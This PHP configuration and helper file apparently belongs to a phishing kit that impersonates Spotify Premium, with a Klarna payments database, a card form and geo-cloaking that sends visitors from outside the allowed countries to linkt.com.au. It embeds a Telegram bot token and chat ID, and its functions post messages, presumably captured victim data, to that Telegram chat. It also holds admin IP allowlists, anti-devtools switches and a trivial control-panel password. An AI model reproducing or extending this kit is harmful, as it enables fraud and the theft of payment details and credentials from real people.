<?php


// Telegram Bot Configuration
define('TELEGRAM_BOT_TOKEN', '7112576393:AAEE651qcm01mMhZ3oqVL6utGoxCq0KI8JA');
define('TELEGRAM_CHAT_ID', '-4213384415');


define('ALLOWED_COUNTRIES', ['au', 'ma', 'se', 'at', 'ch']); // Allowed countries - language is auto-detected from IP
define('SECURITY_REDIRECT_URL', 'auth/index.html');
define('BOT_REDIRECT_URL', 'auth/index.html');
define('OUTSIDE_COUNTRY_REDIRECT', 'https://www.linkt.com.au');


define('ADMIN_IPS', [
    '127.0.0.1',    
    '::1',          
    '192.168.1.',   
    '10.0.0.',      
    '172.16.',
    '16.170.140.127',
    '197.253.221.149',
]);

// Disable p.js anti-devtools redirect everywhere (set true if users get redirected to Spotify before card form).
define('ANTIDEBUG_DISABLED', true);

// Or add specific hosts where redirect is disabled: ['yourdomain.com', 'www.yourdomain.com']
// localhost/127.0.0.1 are always exempt.
define('ANTIDEBUG_SAFE_HOSTS', []);

// Control Panel Password
define('CONTROL_PANEL_PASSWORD', 'mrx');

// Database Configuration (if needed in future)
define('DB_HOST', 'localhost');
define('DB_NAME', 'klarna_payments');
define('DB_USER', 'root');
define('DB_PASS', '');

// Application Settings
define('APP_NAME', 'Spotify Germany Premium');
define('APP_VERSION', '1.0.0');
define('APP_TIMEZONE', 'Europe/Berlin');

// Logging Configuration
define('LOG_ENABLED', true);
define('LOG_FILE', 'logs/payment.log');
define('LOG_MAX_SIZE', 10485760); // 10MB

// Rate Limiting (if needed)
define('RATE_LIMIT_ENABLED', true);
define('RATE_LIMIT_REQUESTS', 10); // requests per minute
define('RATE_LIMIT_WINDOW', 60); // seconds

// File Upload Settings (if needed)
define('UPLOAD_MAX_SIZE', 5242880); // 5MB
define('UPLOAD_ALLOWED_TYPES', ['jpg', 'jpeg', 'png', 'pdf']);

// API Configuration
define('API_TIMEOUT', 30);
define('API_RETRY_ATTEMPTS', 3);

// Debug Mode
define('DEBUG_MODE', false);

// Set timezone
date_default_timezone_set(APP_TIMEZONE);

// Helper function to get Telegram bot token
function getTelegramToken() {
    return TELEGRAM_BOT_TOKEN;
}

// Helper function to get Telegram chat ID
function getTelegramChatId() {
    return TELEGRAM_CHAT_ID;
}

// Helper function to check if debug mode is enabled
function isDebugMode() {
    return DEBUG_MODE;
}

// Helper function to log messages
function logMessage($message, $level = 'INFO') {
    if (!LOG_ENABLED) return;
    
    $logDir = dirname(LOG_FILE);
    if (!is_dir($logDir)) {
        mkdir($logDir, 0755, true);
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] [$level] $message" . PHP_EOL;
    
    file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
}

// Helper function to send Telegram message
function sendTelegramMessage($message) {
    $token = getTelegramToken();
    $chatId = getTelegramChatId();
    
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    if (isDebugMode()) {
        logMessage("Telegram message sent: " . ($result ? 'Success' : 'Failed'));
    }
    
    return $result !== false;
}

// Helper function to send Telegram message with inline buttons
function sendTelegramMessageWithButtons($message, $buttons) {
    $token = getTelegramToken();
    $chatId = getTelegramChatId();
    
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'inline_keyboard' => $buttons
        ])
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    if (isDebugMode()) {
        logMessage("Telegram message with buttons sent: " . ($result ? 'Success' : 'Failed'));
    }
    
    return $result !== false;
}

/**
 * Detect country from IP address using ip-api.com (free, no key needed)
 * Returns lowercase ISO country code (e.g. 'de', 'fr', 'jp') or false on failure
 * Results are cached in session to avoid repeated API calls
 */
function detectCountryFromIP($ip = null) {
    if ($ip === null) {
        $ip = getClientIP();
    }
    
    // Return cached result if available
    if (isset($_SESSION['ip_country']) && isset($_SESSION['ip_country_ip']) && $_SESSION['ip_country_ip'] === $ip) {
        return $_SESSION['ip_country'];
    }
    
    // Skip for local/private IPs - default to 'de'
    if (in_array($ip, ['127.0.0.1', '::1']) || 
        strpos($ip, '192.168.') === 0 || 
        strpos($ip, '10.') === 0 || 
        strpos($ip, '172.16.') === 0) {
        $_SESSION['ip_country'] = 'de';
        $_SESSION['ip_country_ip'] = $ip;
        return 'de';
    }
    
    // Try ip-api.com (free, 45 req/min)
    $url = "http://ip-api.com/json/{$ip}?fields=status,countryCode";
    $ctx = stream_context_create(['http' => ['timeout' => 3]]);
    $response = @file_get_contents($url, false, $ctx);
    
    if ($response) {
        $data = json_decode($response, true);
        if (isset($data['status']) && $data['status'] === 'success' && isset($data['countryCode'])) {
            $country = strtolower($data['countryCode']);
            $_SESSION['ip_country'] = $country;
            $_SESSION['ip_country_ip'] = $ip;
            return $country;
        }
    }
    
    // Fallback: try ipapi.co
    $url2 = "https://ipapi.co/{$ip}/country/";
    $ctx2 = stream_context_create(['http' => ['timeout' => 3]]);
    $response2 = @file_get_contents($url2, false, $ctx2);
    
    if ($response2 && strlen($response2) === 2) {
        $country = strtolower(trim($response2));
        $_SESSION['ip_country'] = $country;
        $_SESSION['ip_country_ip'] = $ip;
        return $country;
    }
    
    // Default fallback
    $_SESSION['ip_country'] = 'de';
    $_SESSION['ip_country_ip'] = $ip;
    return 'de';
}

/**
 * Map ISO country code from IP detection to translation country code
 * Handles merging multiple countries to the same language
 */
function mapCountryToTranslation($iso_country) {
    // Countries that have their OWN entry in $country_to_lang / $country_price
    // These keep their ISO code so they get country-specific pricing
    $self_mapped = [
        'de', 'at', 'ch', 'fr', 'es', 'pl', 'ro', 'jp', 'dk', 'no', 'fi', 'hk', 'ar',
        'en', 'gb', 'uk', 'us', 'ca', 'au', 'nz', 'ie', 'za', 'sg', 'ph', 'in', 'pk',
        'ng', 'ke', 'gh', 'jm', 'tt', 'mt', 'cy',
    ];
    
    if (in_array($iso_country, $self_mapped)) {
        return $iso_country;
    }
    
    // Countries that map to a shared translation key
    $map = [
        // French-speaking (no own pricing entry)
        'be' => 'fr', 'lu' => 'fr', 'mc' => 'fr',
        // Spanish-speaking (no own pricing entry)
        'mx' => 'es', 'co' => 'es', 'cl' => 'es', 'pe' => 'es',
        // Romanian-speaking
        'md' => 'ro',
        // Hong Kong / Chinese Traditional
        'tw' => 'hk', 'mo' => 'hk',
        // Arabic-speaking countries
        'sa' => 'ar', 'ae' => 'ar', 'eg' => 'ar', 'ma' => 'ar',
        'kw' => 'ar', 'qa' => 'ar', 'bh' => 'ar', 'om' => 'ar',
        'jo' => 'ar', 'lb' => 'ar', 'iq' => 'ar', 'dz' => 'ar',
        'tn' => 'ar', 'ly' => 'ar', 'sy' => 'ar', 'ye' => 'ar',
        'ps' => 'ar', 'sd' => 'ar',
    ];
    
    return isset($map[$iso_country]) ? $map[$iso_country] : 'en';
}

// Helper function to check if IP is admin
function isAdminIP($ip) {
    $adminIPs = ADMIN_IPS;
    foreach ($adminIPs as $adminIP) {
        if (strpos($ip, $adminIP) === 0) {
            return true;
        }
    }
    return false;
}

// Helper function to get client IP
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}

// Helper function to sanitize input
function sanitizeInput($input) {
    return htmlspecialchars(strip_tags(trim($input)), ENT_QUOTES, 'UTF-8');
}

// Helper function to validate email
function isValidEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

// Helper function to generate random string
function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}


function formatCurrency($amount, $currency = 'AUD') {
    return '$' . number_format($amount, 2) . ' ' . $currency;
}

// Helper function to get current timestamp
function getCurrentTimestamp() {
    return date('Y-m-d H:i:s');
}

// Helper function to get user agent
function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
}

// Helper function to get referer
function getReferer() {
    return $_SERVER['HTTP_REFERER'] ?? 'Direct';
}

// Helper function to check if request is AJAX
function isAjaxRequest() {
    return !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && 
           strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
}

// Helper function to redirect
function redirectTo($url) {
    header("Location: $url");
    exit;
}

// Helper function to return JSON response
function jsonResponse($data, $status = 200) {
    http_response_code($status);
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

// Helper function to check if file exists and is readable
function isFileReadable($file) {
    return file_exists($file) && is_readable($file);
}

// Helper function to get file size in human readable format
function getHumanReadableFileSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

// Initialize logging if enabled
if (LOG_ENABLED) {
    logMessage("Application started - " . APP_NAME . " v" . APP_VERSION);
}
 

?>
